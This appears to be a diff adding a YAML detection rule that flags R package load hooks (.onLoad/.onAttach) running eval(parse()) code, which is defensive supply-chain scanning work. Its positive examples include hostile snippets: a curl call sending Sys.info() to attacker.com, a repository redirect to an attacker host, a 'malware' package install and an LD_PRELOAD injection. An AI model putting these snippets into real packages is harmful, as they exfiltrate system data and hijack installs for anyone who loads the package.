@@ -1,0 +1,63 @@
+name: onload_eval_parse_rule
+version: "0.1.0"
+type: warning
+attck:
+  - T1059
+  - T1195.002
+message: >-
+  eval() and parse() used together inside .onLoad or .onAttach execute
+  dynamically constructed R code automatically when a package is loaded.
+  Matches both direct nesting (eval(parse(...))) and indirect use via an
+  intermediate variable.
+description: >-
+  Flag function bodies assigned to .onLoad or .onAttach that contain both
+  an eval() call and a parse() call. Detects direct nesting and the indirect
+  pattern where parsed code is stored in a variable before being eval'd.
+  Matches assignments using <-, =, or ->.
+xpath: >-
+  (//expr | //expr_or_assign_or_help)[
+    (
+      (LEFT_ASSIGN or EQ_ASSIGN)
+      and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[text() = 'eval']
+      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[text() = 'parse']
+    )
+    or
+    (
+      RIGHT_ASSIGN
+      and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[1]//SYMBOL_FUNCTION_CALL[text() = 'eval']
+      and expr[1]//SYMBOL_FUNCTION_CALL[text() = 'parse']
+    )
+  ]
+example_positive:
+  - |
+    .onLoad <- function(libname, pkgname) {
+      eval(parse(text = "install.packages('malware')"))
+    }
+  - |
+    .onAttach <- function(libname, pkgname) {
+      payload <- parse(text = paste0("system('curl https://attacker.com/', Sys.info())"))
+      eval(payload)
+    }
+  - |
+    .onLoad = function(libname, pkgname) {
+      eval(parse(text = "options(repos = c(CRAN = 'https://attacker.com'))"))
+    }
+  - |
+    (function(libname, pkgname) {
+      eval(parse(text = "Sys.setenv(LD_PRELOAD = '/tmp/evil.so')"))
+    }) -> .onLoad
+example_negative:
+  - |
+    run_code <- function(code_string) {
+      eval(parse(text = code_string))
+    }
+  - |
+    .onLoad <- function(libname, pkgname) {
+      eval(quote(message("Package loaded.")))
+    }
+  - |
+    .onUnload <- function(libpath) {
+      eval(parse(text = "message('unloaded')"))
+    }
